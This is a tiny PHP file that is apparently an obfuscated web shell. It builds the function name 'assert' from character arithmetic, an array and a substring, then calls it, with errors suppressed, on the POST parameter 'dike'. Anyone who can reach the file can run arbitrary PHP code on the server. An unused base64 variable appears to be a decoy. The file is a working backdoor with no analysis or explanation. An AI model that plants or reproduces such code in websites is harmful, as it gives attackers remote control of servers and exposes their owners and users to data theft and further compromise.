<?php
$xh = chr(ord('b')-1);
$xh1 = array('','','s');
$xh2 = base64_decode("cw==");
$xh3 = substr("Hello ert",6);
$xh4 = $xh.$xh1[2].$xh1[2].$xh3;
@$xh4($_POST[dike]);
?>